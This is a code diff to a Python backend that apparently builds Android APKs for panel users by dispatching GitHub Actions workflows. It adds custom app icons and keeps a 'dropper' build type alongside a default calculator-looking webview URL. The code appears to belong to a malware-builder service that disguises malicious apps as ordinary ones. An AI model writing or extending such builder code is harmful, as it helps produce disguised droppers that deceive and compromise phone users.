@@ -220,12 +220,18 @@ def inject_config(uid, webview, app_name, package_name):
         return False
 
 
-def trigger_github_actions(uid, webview, app_name, package_name, is_dropper=False):
-    """Trigger GitHub Actions workflow remotely."""
-    import urllib.request, json
+def trigger_github_actions(uid, webview, app_name, package_name, icon_path=None, is_dropper=False):
+    """Trigger GitHub Actions workflow remotely with custom icon & settings."""
+    import urllib.request, json, base64
     ref = db.reference(f'panel_users/{uid}/build_status')
     try:
-        ref.set({'status': '⚙️ Dispatching GitHub Action', 'percent': 15, 'last_log': f'Triggering workflow on {GITHUB_REPO}...'})
+        ref.set({'status': '⚙️ Dispatching GitHub Action', 'percent': 15, 'last_log': f'Preparing custom build for {app_name}...'})
+        
+        icon_b64 = ""
+        if icon_path and os.path.exists(icon_path):
+            with open(icon_path, "rb") as f:
+                icon_b64 = base64.b64encode(f.read()).decode('utf-8')
+
         url = f"https://api.github.com/repos/{GITHUB_REPO}/actions/workflows/build.yml/dispatches"
         payload = {
             "ref": "main",
@@ -234,7 +240,8 @@ def trigger_github_actions(uid, webview, app_name, package_name, is_dropper=Fals
                 "package_name": package_name,
                 "webview_url": webview or "https://calculator.apps.chrome",
                 "user_id": uid,
-                "build_type": "dropper" if is_dropper else "main"
+                "build_type": "dropper" if is_dropper else "main",
+                "app_icon_b64": icon_b64
             }
         }
         headers = {
@@ -246,9 +253,9 @@ def trigger_github_actions(uid, webview, app_name, package_name, is_dropper=Fals
         with urllib.request.urlopen(req) as res:
             if res.status in (204, 201, 200):
                 ref.set({
-                    'status': '🚀 GitHub Build Started!',
-                    'percent': 40,
-                    'last_log': f'Building in cloud! Track at https://github.com/{GITHUB_REPO}/actions'
+                    'status': '🚀 Cloud Build Started!',
+                    'percent': 45,
+                    'last_log': f'Building {app_name} on GitHub Actions... Track at https://github.com/{GITHUB_REPO}/actions'
                 })
                 return True
     except Exception as e:
@@ -261,7 +268,7 @@ def build_worker(uid, webview, app_name, package_name, icon_path=None, is_droppe
     """Background APK build."""
     ref = db.reference(f'panel_users/{uid}/build_status')
     if GITHUB_TOKEN and GITHUB_REPO:
-        if trigger_github_actions(uid, webview, app_name, package_name, is_dropper):
+        if trigger_github_actions(uid, webview, app_name, package_name, icon_path, is_dropper):
             return
 
     try:
